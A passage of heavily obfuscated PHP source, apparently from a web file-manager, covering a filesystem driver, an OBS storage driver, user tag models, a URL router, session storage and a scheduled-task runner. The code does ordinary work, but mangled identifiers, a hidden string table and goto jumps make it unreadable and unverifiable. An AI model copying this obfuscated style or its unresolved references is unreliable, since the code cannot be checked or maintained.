!is_link($ïñ¯“ëÂ) ? 1 : 0; $ïñ¯“ëÂ = $”ÃªÀ›ô ? $ïñ¯“ëÂ . $©ÈÄû—ï[8] : $ïñ¯“ëÂ; $ßÃ—„ª[] = array($©ÈÄû—ï[87] => $this->getPathOuter($ïñ¯“ëÂ), $©ÈÄû—ï[78] => $”ÃªÀ›ô, $©ÈÄû—ï[88] => intval(@filemtime($ïñ¯“ëÂ)), $©ÈÄû—ï[79] => $”ÃªÀ›ô ? 0 : intval($this->size($ïñ¯“ëÂ))); if ($”ÃªÀ›ô) { $this->listAll($ïñ¯“ëÂ, $ßÃ—„ª); } } closedir($ÛéË¼÷Ñ); return $ßÃ—„ª; } public function has($³ªÂÚ¦ö, $Öšƒ©ˆõ = false, $ø¤İşâø = true) { $“è¥Å±‚ =& $_SERVER[†ûãı«°]; $³ªÂÚ¦ö = $this->iconvSystem($³ªÂÚ¦ö); $³ªÂÚ¦ö = rtrim($³ªÂÚ¦ö, $“è¥Å±‚[8]) . $“è¥Å±‚[8]; if (!($·ÌÜµïß = @opendir($³ªÂÚ¦ö))) { return !1; } $Â°µ±íì = 0; $¦šóûÍÑ = 0; $œİûï±– = 0; while (($©ÀÇÚ–£ = readdir($·ÌÜµïß)) !== !1) { if ($©ÀÇÚ–£ == $“è¥Å±‚[10] || $©ÀÇÚ–£ == $“è¥Å±‚[1374]) { continue; } $Šâƒ¯¼ü = $³ªÂÚ¦ö . $©ÀÇÚ–£; if ($Öšƒ©ˆõ) { $œİûï±–++; if (@is_file($Šâƒ¯¼ü)) { $Â°µ±íì++; } else { $¦šóûÍÑ++; } if ($œİûï±– > 10000) { break; } continue; } if ($ø¤İşâø) { if (@is_file($Šâƒ¯¼ü)) { return !0; } } else { if (@is_dir($Šâƒ¯¼ü . $“è¥Å±‚[8])) { return !0; } } } closedir($·ÌÜµïß); if ($Öšƒ©ˆõ) { return array($“è¥Å±‚[241] => $Â°µ±íì, $“è¥Å±‚[242] => $¦šóûÍÑ); } return !1; } public function hashSimple($Ê¼˜”Û) { $Ïƒì’¦¸ =& $_SERVER[†ûãı«°]; if (!$Ê¼˜”Û) { return md5($Ïƒì’¦¸[12]); } $Ê¼˜”Û = $this->iconvSystem($Ê¼˜”Û); $–¦­—Ê§ = $this->size($Ê¼˜”Û); $ØÓºÖ„ = 200; $ÀÁíœŒª = 50; if ($–¦­—Ê§ <= $ØÓºÖ„ * $ÀÁíœŒª) { return $this->hashMd5($Ê¼˜”Û) . $–¦­—Ê§; } $Úë³„â‚ = $Ïƒì’¦¸[12]; $¤Äî°˜¯ = intval($–¦­—Ê§ / $ÀÁíœŒª); $šÔ¤ìæ² = fopen($Ê¼˜”Û, $Ïƒì’¦¸[1470]); if (!$šÔ¤ìæ²) { return $Úë³„â‚; } for ($Ç°Ş¯ûå = 0; $Ç°Ş¯ûå < $ÀÁíœŒª; $Ç°Ş¯ûå++) { fseek_64($šÔ¤ìæ², $¤Äî°˜¯ * $Ç°Ş¯ûå); $Úë³„â‚ .= fread($šÔ¤ìæ², $ØÓºÖ„); } fseek_64($šÔ¤ìæ², $–¦­—Ê§ - $ØÓºÖ„); $Úë³„â‚ .= fread($šÔ¤ìæ², $ØÓºÖ„); fclose($šÔ¤ìæ²); return md5($Úë³„â‚) . $–¦­—Ê§; } public function getContent($åÜŒœ¦û) { $åÜŒœ¦û = $this->iconvSystem($åÜŒœ¦û); return file_get_contents($åÜŒœ¦û); } public function setContent($Ïñ ¿şÎ, $› ÷¶í€ = '') { $Ïñ ¿şÎ = $this->iconvSystem($Ïñ ¿şÎ); $ŒÅ®ƒÏè = @file_put_contents($Ïñ ¿şÎ, $› ÷¶í€, LOCK_EX); if (!$ŒÅ®ƒÏè) { $this->writeLog(__FUNCTION__ . $_SERVER[†ûãı«°][1462], !0); } clearstatcache(); @chmod($Ïñ ¿şÎ, $this->pathAuth); return $ŒÅ®ƒÏè === !1 ? !1 : !0; } public function fileSubstr($ÎĞóåÂä, $óåùòŠÅ = 0, $ÔÍëÑƒ‘ = false) { $¯¬Ä ¹À =& $_SERVER[†ûãı«°]; $ÎĞóåÂä = $this->iconvSystem($ÎĞóåÂä); if ($ÔÍëÑƒ‘ === !1) { $ÔÍëÑƒ‘ = $this->size($ÎĞóåÂä); } if ($ÔÍëÑƒ‘ <= 0) { return $¯¬Ä ¹À[12]; } $öÕª°äë = fopen($ÎĞóåÂä, $¯¬Ä ¹À[1470]); if (!$öÕª°äë) { return !1; } fseek_64($öÕª°äë, $óåùòŠÅ); $¡İ€­¢ = fread($öÕª°äë, $ÔÍëÑƒ‘); fclose($öÕª°äë); if (!$¡İ€­¢) { $this->writeLog(__FUNCTION__ . $¯¬Ä ¹À[1462], !0); } return $¡İ€­¢; } public function upload($ÊÎÎÛÜÆ, $ô¼ãÀ™, $Ù”ôÁ = false, $Ó¯ôî‡Å = REPEAT_REPLACE) { if ($Ù”ôÁ) { return $this->moveFile($ô¼ãÀ™, $ÊÎÎÛÜÆ); } return $this->copyFile($ô¼ãÀ™, $ÊÎÎÛÜÆ); } public function setModifyTime($úáĞÔ¾Ó, $î¦Ó—­á = '') { @touch($úáĞÔ¾Ó, intval($î¦Ó—­á)); } public function download($Õ¿“üÓ, $ñÇ›Öõ¬) { return $this->iconvSystem($Õ¿“üÓ); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($Èù’Í¤Ê) { parent::__construct($Èù’Í¤Ê); $this->setSignVersion($_SERVER[†ûãı«°][249]); } public function fileOutImage($†êİ¨”¬, $ÅÁ²¦¬ = 250) { $İï½œ‚¢ =& $_SERVER[†ûãı«°]; if ($this->size($†êİ¨”¬) > 1024 * 1024 * 25) { return $this->fileOutImageServer($†êİ¨”¬, $ÅÁ²¦¬); } $¹¡’ïç = array($İï½œ‚¢[1471] => $İï½œ‚¢[1472] . $ÅÁ²¦¬ . $İï½œ‚¢[1473]); $ğÛğÓïé = $this->link($†êİ¨”¬, $¹¡’ïç); $this->fileOutLink($ğÛğÓïé); } public function fileOutLink($ŞÉåÕØÉ) { $™èƒ†´„ =& $_SERVER[†ûãı«°]; if (substr($ŞÉåÕØÉ, 0, 7) == $™èƒ†´„[218]) { $ŞÉåÕØÉ = $™èƒ†´„[219] . substr($ŞÉåÕØÉ, 7); } header($™èƒ†´„[175] . $ŞÉåÕØÉ); die; } } goto bÃÅê†­ƒã; Bê­µŠ»Ó: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\137\x6f\160\164\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($—õ•†·Ã) { $¹ÇÜ²Æª =& $_SERVER[†ûãı«°]; $’õÏ«‚ = defined($¹ÇÜ²Æª[2214]) && USER_ID ? USER_ID : $¹ÇÜ²Æª[12]; return "\x55\x73\145\x72\x4f\x70\164\x69\x6f\x6e\x5f{$—õ•†·Ã}\137" . $’õÏ«‚; } protected function filterWhere($×ÁÛ¥€) { $Ê­ËäÙˆ =& $_SERVER[†ûãı«°]; $×ÁÛ¥€[$Ê­ËäÙˆ[1783]] = defined($Ê­ËäÙˆ[2214]) && USER_ID ? USER_ID : $Ê­ËäÙˆ[12]; return $×ÁÛ¥€; } public function cacheRemoveUser($İÓÉ‹æ™, $õŒ’ä„ò) { return Cache::remove("\x55\x73\145\x72\x4f\160\x74\x69\157\x6e\137{$İÓÉ‹æ™}\137" . $õŒ’ä„ò); } protected function optionDefault($•Å¶½›Ò = '') { $ôŠ”ÉÃƒ =& $_SERVER[†ûãı«°]; if ($•Å¶½›Ò == $ôŠ”ÉÃƒ[12]) { return $GLOBALS[$ôŠ”ÉÃƒ[6]][$ôŠ”ÉÃƒ[2525]]; } if ($•Å¶½›Ò == $ôŠ”ÉÃƒ[2526]) { return $GLOBALS[$ôŠ”ÉÃƒ[6]][$ôŠ”ÉÃƒ[2527]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\162\x2e\x74\141\x67\114\x69\x73\164"; public $modelType = "\125\x73\x65\x72\x4f\x70\x74\x69\x6f\x6e"; public $field = array("\x6e\141\x6d\x65", "\163\164\171\154\x65", "\163\x6f\162\164"); public function listData($Ä–àï© = false, $™÷¿°¥ = "\163\x6f\x72\x74", $æ¾ôš¼œ = false) { return parent::listData($Ä–àï©, $™÷¿°¥, $æ¾ôš¼œ); } public function remove($·ôå¤¡Û) { return parent::remove($·ôå¤¡Û); } public function add($¥õ¥òŠ, $ú­ê°Œ = "\154\x61\142\145\x6c\x2d\x67\162\x65\x79\55\x6e\x6f\x72\155\x61\x6c") { $—Õ¼¥º =& $_SERVER[†ûãı«°]; if ($this->findByName($¥õ¥òŠ)) { return !1; } $û­¾ëÉ… = array($—Õ¼¥º[496] => $¥õ¥òŠ, $—Õ¼¥º[562] => $ú­ê°Œ, $—Õ¼¥º[1988] => $this->getSort($—Õ¼¥º[337]) + 1); return parent::insert($û­¾ëÉ…); } public function update($›”µ¢¢ê, $¨³•òÍü) { $ƒ«ûøá÷ =& $_SERVER[†ûãı«°]; $î¡ûìş° = $this->listData($›”µ¢¢ê); $œÚ°üå = $this->findByName($¨³•òÍü[$ƒ«ûøá÷[32]]); if (!$î¡ûìş° || $œÚ°üå && $œÚ°üå[$ƒ«ûøá÷[477]] != $î¡ûìş°[$ƒ«ûøá÷[477]]) { return !1; } return parent::update($›”µ¢¢ê, $¨³•òÍü); } public function moveTop($ÂÁÇäè­) { $Œã—Œ«‘ =& $_SERVER[†ûãı«°]; $¥î×·©ñ = parent::listData(); $ùÇËíÙ› = $this->getSort($Œã—Œ«‘[336]); foreach ($¥î×·©ñ as &$íâƒ¤¹) { if ($íâƒ¤¹[$Œã—Œ«‘[477]] == $ÂÁÇäè­) { $íâƒ¤¹[$Œã—Œ«‘[2008]] = $ùÇËíÙ›; continue; } $íâƒ¤¹[$Œã—Œ«‘[2008]] += 1; } unset($íâƒ¤¹); return parent::resetData($¥î×·©ñ); } public function moveBottom($¸Àášìƒ) { $Âã“Ç¡© =& $_SERVER[†ûãı«°]; $‚ğöÛÍ‹ = $this->getSort($Âã“Ç¡©[337]) + 1; return parent::update($¸Àášìƒ, array($Âã“Ç¡©[2008] => $‚ğöÛÍ‹)); } public function resetSort($ĞÈ¥ìïÃ) { $‰‹ïİ¨Å =& $_SERVER[†ûãı«°]; $ÕìÕÒ“© = array(); $ĞÈ¥ìïÃ = is_array($ĞÈ¥ìïÃ) ? $ĞÈ¥ìïÃ : array(); for ($àÑ¹şÉ = 0; $àÑ¹şÉ < count($ĞÈ¥ìïÃ); $àÑ¹şÉ++) { $ÕìÕÒ“©[$ĞÈ¥ìïÃ[$àÑ¹şÉ] . $‰‹ïİ¨Å[12]] = $àÑ¹şÉ + 1; } $Ô¼ß§Ê = parent::listData(); foreach ($Ô¼ß§Ê as &$Ëë¤ò€Û) { $Š¯·×ä“ = $ÕìÕÒ“©[$Ëë¤ò€Û[$‰‹ïİ¨Å[477]]]; $Ëë¤ò€Û[$‰‹ïİ¨Å[2008]] = $Š¯·×ä“ ? $Š¯·×ä“ : $Ëë¤ò€Û[$‰‹ïİ¨Å[2008]]; } unset($Ëë¤ò€Û); return parent::resetData($Ô¼ß§Ê); } private function getSort($À‘²±¥’) { $«¥óÜî¦ =& $_SERVER[†ûãı«°]; $Ëª¯Õ¤¹ = parent::listData(); $–é–ìØÚ = array_to_keyvalue($Ëª¯Õ¤¹, $«¥óÜî¦[12], $«¥óÜî¦[2008]); if (!$–é–ìØÚ) { $–é–ìØÚ = array(0); } $ƒµ®é¤Ó = $À‘²±¥’ == $«¥óÜî¦[337] ? max($–é–ìØÚ) : min($–é–ìØÚ); return intval($ƒµ®é¤Ó); } } goto b×‹‚¡‚‡´; dø»ö¤ø®…: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\x79" => "\x5b\136\57\x5d\x2b", "\72\156\x75\x6d" => "\x5b\60\x2d\x39\135\53", "\x3a\141\154\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($ö«µèÁĞ, $œ©Šüû) { $ñƒìâ ¿ =& $_SERVER[†ûãı«°]; if ($ö«µèÁĞ == $ñƒìâ ¿[1718]) { $ö†¢ı†Ü = array_map($ñƒìâ ¿[1719], $œ©Šüû[0]); $¡‰¾ù = strpos($œ©Šüû[1], $ñƒìâ ¿[8]) === 0 ? $œ©Šüû[1] : $ñƒìâ ¿[8] . $œ©Šüû[1]; $ÅàÖÒ = $œ©Šüû[2]; } else { $ö†¢ı†Ü = null; $¡‰¾ù = strpos($œ©Šüû[0], $ñƒìâ ¿[8]) === 0 ? $œ©Šüû[0] : $ñƒìâ ¿[8] . $œ©Šüû[0]; $ÅàÖÒ = $œ©Šüû[1]; } array_push(self::$maps, $ö†¢ı†Ü); array_push(self::$routes, $¡‰¾ù); array_push(self::$methods, strtoupper($ö«µèÁĞ)); array_push(self::$callbacks, $ÅàÖÒ); } public static function error($Ãä·¸¢›) { self::$errorCallback = $Ãä·¸¢›; } public static function haltOnMatch($­‡îçÌÕ = true) { self::$halts = $­‡îçÌÕ; } public static function dispatch() { $ºè€…ª¦ =& $_SERVER[†ûãı«°]; $ÔëŠí³ó = parse_url($_SERVER[$ºè€…ª¦[1720]], PHP_URL_PATH); $£¶§„¿ø = $_SERVER[$ºè€…ª¦[164]]; $â¿µŸüĞ = array_keys(static::$patterns); $Ü§´×…ˆ = array_values(static::$patterns); $ş×¡ïÂ› = !1; self::$routes = preg_replace($ºè€…ª¦[1372], $ºè€…ª¦[8], self::$routes); if (in_array($ÔëŠí³ó, self::$routes)) { $ÕÁÉ¦•¨ = array_keys(self::$routes, $ÔëŠí³ó); foreach ($ÕÁÉ¦•¨ as $¬Ó®Áõ±) { if (self::$methods[$¬Ó®Áõ±] == $£¶§„¿ø || self::$methods[$¬Ó®Áõ±] == $ºè€…ª¦[1721] || in_array($£¶§„¿ø, self::$maps[$¬Ó®Áõ±])) { $ş×¡ïÂ› = !0; if (!is_object(self::$callbacks[$¬Ó®Áõ±])) { $Çù¼ˆ°– = explode($ºè€…ª¦[8], self::$callbacks[$¬Ó®Áõ±]); $ÖÈ©ŠÄ = end($Çù¼ˆ°–); $ÃµâàÕ¨ = explode($ºè€…ª¦[1304], $ÖÈ©ŠÄ); $ş™¡Çá = new $ÃµâàÕ¨[0](); $ş™¡Çá->{$ÃµâàÕ¨[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$¬Ó®Áõ±]); if (self::$halts) { return; } } } } } else { $ÊóÉ¸¢ = 0; foreach (self::$routes as $¬Ó®Áõ±) { if (strpos($¬Ó®Áõ±, $ºè€…ª¦[4]) !== !1) { $¬Ó®Áõ± = str_replace($â¿µŸüĞ, $Ü§´×…ˆ, $¬Ó®Áõ±); } if (preg_match($ºè€…ª¦[1722] . $¬Ó®Áõ± . $ºè€…ª¦[1723], $ÔëŠí³ó, $Ïã¾§àË)) { if (self::$methods[$ÊóÉ¸¢] == $£¶§„¿ø || self::$methods[$ÊóÉ¸¢] == $ºè€…ª¦[1721] || !empty(self::$maps[$ÊóÉ¸¢]) && in_array($£¶§„¿ø, self::$maps[$ÊóÉ¸¢])) { $ş×¡ïÂ› = !0; array_shift($Ïã¾§àË); if (!is_object(self::$callbacks[$ÊóÉ¸¢])) { $Çù¼ˆ°– = explode($ºè€…ª¦[8], self::$callbacks[$ÊóÉ¸¢]); $ÖÈ©ŠÄ = end($Çù¼ˆ°–); $ÃµâàÕ¨ = explode($ºè€…ª¦[1304], $ÖÈ©ŠÄ); $ş™¡Çá = new $ÃµâàÕ¨[0](); if (!method_exists($ş™¡Çá, $ÃµâàÕ¨[1])) { echo $ºè€…ª¦[1724]; } else { call_user_func_array(array($ş™¡Çá, $ÃµâàÕ¨[1]), $Ïã¾§àË); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ÊóÉ¸¢], $Ïã¾§àË); if (self::$halts) { return; } } } } $ÊóÉ¸¢++; } } if ($ş×¡ïÂ› == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $şÆ ş =& $_SERVER[†ûãı«°]; header($_SERVER[$şÆ ş[1725]] . $şÆ ş[1726]); echo $şÆ ş[1727]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ºè€…ª¦[1720]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $¸¼†éÓõ =& $_SERVER[†ûãı«°]; static $Ü©šµ³³ = false; if ($Ü©šµ³³) { return $Ü©šµ³³; } $šÄî„–Ñ = $GLOBALS[$¸¼†éÓõ[6]][$¸¼†éÓõ[426]]; self::$sessionTime = $šÄî„–Ñ[$¸¼†éÓõ[1728]]; $ú•”–Íº = isset($GLOBALS[$¸¼†éÓõ[1729]]) ? $GLOBALS[$¸¼†éÓõ[1729]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ú•”–Íº)) { self::$sessionSign = Cookie::get($ú•”–Íº); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ú•”–Íº, self::$sessionSign, self::$sessionTime); $‰Ñ€™õ = $šÄî„–Ñ[$¸¼†éÓõ[1730]]; $ôÑĞæ = $šÄî„–Ñ[$‰Ñ€™õ]; $ï„äÉÊ° = $šÄî„–Ñ[$¸¼†éÓõ[909]]; switch ($‰Ñ€™õ) { case $¸¼†éÓõ[21]: self::$handle = Model($¸¼†éÓõ[910]); break; case $¸¼†éÓõ[911]: self::$handle = new CacheRedis($ôÑĞæ, $ï„äÉÊ°); break; case $¸¼†éÓõ[912]: self::$handle = new CacheMemcached($ôÑĞæ, $ï„äÉÊ°); break; case $¸¼†éÓõ[232]: $ôÑĞæ[$¸¼†éÓõ[87]] = $ôÑĞæ[$¸¼†éÓõ[87]] . $¸¼†éÓõ[1731]; self::$handle = new CacheFile($ôÑĞæ, $ï„äÉÊ°); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $Ü©šµ³³ = new self(); return $Ü©šµ³³; } public static function getBySign($’–šŞÂ´) { $‘âØßÄ = self::$handle->get($’–šŞÂ´); $‘âØßÄ = unserialize($‘âØßÄ); return is_array($‘âØßÄ) ? $‘âØßÄ : array(); } public static function setBySign($Ş¨Èà¢â, $’äÅ²¦ú) { CacheLock::lock($Ş¨Èà¢â); self::$handle->set($Ş¨Èà¢â, serialize($’äÅ²¦ú), self::$sessionTime); CacheLock::unlock($Ş¨Èà¢â); } public static function sign($§Û¬È— = false) { if ($§Û¬È—) { self::$sessionSign = $§Û¬È—; } self::init(); return self::$sessionSign; } public static function set($¡ˆ»”–„, $Ğêõ¼¶² = false) { self::init(); if (is_array($¡ˆ»”–„)) { foreach ($¡ˆ»”–„ as $ÅŞ˜ÎÊá => $®ÓØÅØ) { array_set_value(self::$data, $ÅŞ˜ÎÊá, $®ÓØÅØ); } } else { array_set_value(self::$data, $¡ˆ»”–„, $Ğêõ¼¶²); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ÄÒ±’ßÄ = false) { self::init(); if (!$ÄÒ±’ßÄ) { return self::$data; } return array_get_value(self::$data, $ÄÒ±’ßÄ); } public static function remove($§­ã˜«¥) { self::init(); unset(self::$data[$§­ã˜«¥]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[†ûãı«°][915])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $³Ó¸ªšô =& $_SERVER[†ûãı«°]; if (self::valueGet($³Ó¸ªšô[826]) != $³Ó¸ªšô[91]) { return; } if (self::valueGet($³Ó¸ªšô[1732]) == $³Ó¸ªšô[91]) { $äö°Âˆñ = self::valueGet($³Ó¸ªšô[1733]); if (time() - $äö°Âˆñ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($³Ó¸ªšô[1732], $³Ó¸ªšô[91]); self::log($³Ó¸ªšô[1734] . ACTION . $³Ó¸ªšô[1735]); Hook::bind($³Ó¸ªšô[1736], $³Ó¸ªšô[1737]); $¤Âç§ëï = 0; while (!0) { self::cacheClear(); if (self::valueGet($³Ó¸ªšô[826]) != $³Ó¸ªšô[91]) { self::valueSet($³Ó¸ªšô[1732], $³Ó¸ªšô[230]); self::log($³Ó¸ªšô[1738]); die; } $‡€ÄÛşÕ = time(); if ($‡€ÄÛşÕ - $¤Âç§ëï >= 60) { self::valueSet(array($³Ó¸ªšô[1732] => $³Ó¸ªšô[91], $³Ó¸ªšô[1733] => $‡€ÄÛşÕ)); $¤Âç§ëï = $‡€ÄÛşÕ; } if (!file_exists(USER_SYSTEM . $³Ó¸ªšô[1739])) { self::valueSet(array($³Ó¸ªšô[1732] => $³Ó¸ªšô[230], $³Ó¸ªšô[826] => $³Ó¸ªšô[230])); self::log($³Ó¸ªšô[1740]); die; } $Ûí¼ëÇ = file_get_contents(BASIC_PATH . $³Ó¸ªšô[1741]); $Æ“‘€ = KOD_VERSION . $³Ó¸ªšô[10] . KOD_VERSION_BUILD; $­Õ²Ş ï = match_text($Ûí¼ëÇ, $³Ó¸ªšô[1742]) . $³Ó¸ªšô[10] . match_text($Ûí¼ëÇ, $³Ó¸ªšô[1743]); if ($­Õ²Ş ï != $Æ“‘€) { self::restart(); self::log("\x73\164\x6f\160\145\x64\56\133\166\x65\x72\163\151\157\x6e\x20\165\160\x64\141\164\x65\x3b{$versionNow}\40\75\76\x20{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $€“áŸ£ˆ =& $_SERVER[†ûãı«°]; http_close(); $GLOBALS[$€“áŸ£ˆ[1744]] = 1; $_SERVER[$€“áŸ£ˆ[1745]] = $€“áŸ£ˆ[1746]; $_COOKIE = array(); $GLOBALS[$€“áŸ£ˆ[1747]] = 1; $GLOBALS[$€“áŸ£ˆ[1748]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $—©¼ïÉ =& $_SERVER[†ûãı«°]; http_close(); self::valueSet($—©¼ïÉ[826], $—©¼ïÉ[230]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($—©¼ïÉ[1732] => $—©¼ïÉ[230], $—©¼ïÉ[826] => $—©¼ïÉ[91])); self::log($—©¼ïÉ[1749]); } public static function taskSwitch() { $ŠÌ²‹¤‘ =& $_SERVER[†ûãı«°]; $Óü‚“û’ = self::valueGet($ŠÌ²‹¤‘[826]) == $ŠÌ²‹¤‘[91] ? $ŠÌ²‹¤‘[230] : $ŠÌ²‹¤‘[91]; self::valueSet($ŠÌ²‹¤‘[826], $Óü‚“û’); } public static function shutdownEvent() { $ò½œ»Ã =& $_SERVER[†ûãı«°]; self::valueSet($ò½œ»Ã[1732], $ò½œ»Ã[230]); self::log($ò½œ»Ã[1750]); } public static function config($À Ü½©, $‰…µò¨¤) { self::valueSet($_SERVER[†ûãı«°][826], $À Ü½©); } private static function taskRunAll() { $Ğ•ıå„î =& $_SERVER[†ûãı«°]; $ãƒ¤»±£ = timeFloat(); $¢åºØµš = Model($Ğ•ıå„î[1751])->listData(); $ÄšÓÛÆÔ = count($¢åºØµš); for ($Àè“¸ö = 0; $Àè“¸ö < $ÄšÓÛÆÔ; $Àè“¸ö++) { $´Ù¨Á¿µ = $¢åºØµš[$Àè“¸ö]; if (!$´Ù¨Á¿µ[$Ğ•ıå„î[477]] || $´Ù¨Á¿µ[$Ğ•ıå„î[1752]] != $Ğ•ıå„î[91]) { continue; } if (!self::taskTimeCheck($´Ù¨Á¿µ)) { continue; } self::taskRun($´Ù¨Á¿µ); } Hook::trigger($Ğ•ıå„î[1753]); self::taskQueueRun($ãƒ¤»±£); } private static function taskQueueRun($ÌÕúšš) { $ÚÀÑ¤‡á = 10; while (!0) { $øË¬Ìˆš = TaskQueue::run(); if ($øË¬Ìˆš === !1) { break; } if (timeFloat() - $ÌÕúšš >= $ÚÀÑ¤‡á) { break; } } } private static function taskTimeCheck($²äòæ°ã) { $ŒÒÄÌ« =& $_SERVER[†ûãı«°]; $²ÀÙºÜ¾ = json_decode($²äòæ°ã[$ŒÒÄÌ«[206]], !0); $½Ú»ç = intval($²äòæ°ã[$ŒÒÄÌ«[1733]]); $ê àúãÁ = strtotime($ŒÒÄÌ«[1754] . $²ÀÙºÜ¾[$ŒÒÄÌ«[1755]] . $ŒÒÄÌ«[1756]) - strtotime($ŒÒÄÌ«[1757]); $‰¢óÍª’ = time() - strtotime(date($ŒÒÄÌ«[1758]) . $ŒÒÄÌ«[1759]); $ÌèÄ“µ = $‰¢óÍª’ >= $ê àúãÁ && $‰¢óÍª’ <= $ê àúãÁ + 3600; switch ($²ÀÙºÜ¾[$ŒÒÄÌ«[33]]) { case $ŒÒÄÌ«[1760]: if (time() - $½Ú»ç < 3600 * 24 * 30) { return !1; } if ($²ÀÙºÜ¾[$ŒÒÄÌ«[1760]] == date($ŒÒÄÌ«[1761]) && $ÌèÄ“µ) { return !0; } break; case $ŒÒÄÌ«[1762]: if (time() - $½Ú»ç < 3600 * 24 * 7) { return !1; } $İÛìøºú = date($ŒÒÄÌ«[1763]) == 0 ? 7 : date($ŒÒÄÌ«[1763]); if ($²ÀÙºÜ¾[$ŒÒÄÌ«[1762]] == $İÛìøºú && $ÌèÄ“µ) { return !0; } break; case $ŒÒÄÌ«[1755]: if (time() - $½Ú»ç < 3600 * 24) { return !1; } if ($ÌèÄ“µ) { return !0; } break; case $ŒÒÄÌ«[1764]: if (time() - $½Ú»ç >= floatval($²ÀÙºÜ¾[$ŒÒÄÌ«[1764]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $šñışš =& $_SERVER[†ûãı«°]; static $âÆÆÇšÖ = 0; $‹¾˜¦ÕÌ = 300; if (!$âÆÆÇšÖ) { $âÆÆÇšÖ = time(); } if (time() - $âÆÆÇšÖ < $‹¾˜¦ÕÌ) { return; } $âÆÆÇšÖ = time(); $¥ºË·µƒ = Model($šñışš[581])->db($šñışš[12]); if ($¥ºË·µƒ) { $¥ºË·µƒ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($šñışš[1765], $šñışš[1766]); die; } } public static function taskRun($ş·ÎÙ¬¥) { $Â’öÚáœ =& $_SERVER[†ûãı«°]; self::log($Â’öÚáœ[1767] . $ş·ÎÙ¬¥[$Â’öÚáœ[477]] . $Â’öÚáœ[1768] . $ş·ÎÙ¬¥[$Â’öÚáœ[32]] . $Â’öÚáœ[1769] . $ş·ÎÙ¬¥[$Â’öÚáœ[1770]]); Model($Â’öÚáœ[1751])->run($ş·ÎÙ¬¥[$Â’öÚáœ[477]]); $Ší¤ä†ù = timeFloat(); $’Œƒªã = $Â’öÚáœ[12]; switch ($ş·ÎÙ¬¥[$Â’öÚáœ[33]]) { case $Â’öÚáœ[384]: $Ç“¿°¼· = url_request($ş·ÎÙ¬¥[$Â’öÚáœ[1770]], $Â’öÚáœ[1507], !1, !1, !1, !1, 10); if ($Ç“¿°¼·[$Â’öÚáœ[826]]) { $’Œƒªã = strlen($Ç“¿°¼·[$Â’öÚáœ[1298]]); } break; case $Â’öÚáœ[1771]: $’Œƒªã = Hook::apply($ş·ÎÙ¬¥[$Â’öÚáœ[1770]]); default: break; } Model($Â’öÚáœ[1772])->add(array($Â’öÚáœ[1773] => $Â’öÚáœ[12], $Â’öÚáœ[1774] => $Â’öÚáœ[230], $Â’öÚáœ[33] => $Â’öÚáœ[1775] . $ş·ÎÙ¬¥[$Â’öÚáœ[477]], $Â’öÚáœ[1776] => json_encode(array($Â’öÚáœ[32] => $ş·ÎÙ¬¥[$Â’öÚáœ[32]], $Â’öÚáœ[1777] => timeFloat() - $Ší¤ä†ù, $Â’öÚáœ[370] => $’Œƒªã)))); $°ì¿¬”¤ = $’Œƒªã ? $Â’öÚáœ[1778] . $’Œƒªã : $Â’öÚáœ[12]; self::log($Â’öÚáœ[1779] . $ş·ÎÙ¬¥[$Â’öÚáœ[477]] . $Â’öÚáœ[178] . $°ì¿¬”¤); return !0; } public static function valueGet($Ôİå×ĞŞ) { $¯§ŞË´ =& $_SERVER[†ûãı«°]; $äë—äØ = $¯§ŞË´[1780]; $Ä½î÷±÷ = Model($¯§ŞË´[510])->get($Ôİå×ĞŞ, $äë—äØ); if (is_null($Ä½î÷±÷)) { Model($¯§ŞË´[510])->set($¯§ŞË´[826], $¯§ŞË´[91], $äë—äØ); Model($¯§ŞË´[510])->set($¯§ŞË´[1732], $¯§ŞË´[230], $äë—äØ); $Ä½î÷±÷ = Model($¯§ŞË´[510])->get($Ôİå×ĞŞ, $äë—äØ); } return $Ä½î÷±÷; } private static function valueSet($Ÿ»Ø¤‡¸, $ïÕÛÈã‹ = false) { $ö‹ÜüÖ =& $_SERVER[†ûãı«°]; $½’¹èø = $ö‹ÜüÖ[1781]; CacheLock::lock($½’¹èø); $Ú¹Í©­‹ = Model($ö‹ÜüÖ[510])->set($Ÿ»Ø¤‡¸, $ïÕÛÈã‹, $ö‹ÜüÖ[1780]); CacheLock::unlock($½’¹èø); return $Ú¹Í©­‹; } protected static function log($Œù©æŒ) { write_log($Œù©æŒ, $_SERVER[†ûãı«°][1766]); } private static function cacheClear() { $öæà²½Ï =& $_SERVER[†ûãı«°]; Cache::clearMemory(Model($öæà²½Ï[510])->cacheKey($öæà²½Ï[1780])); 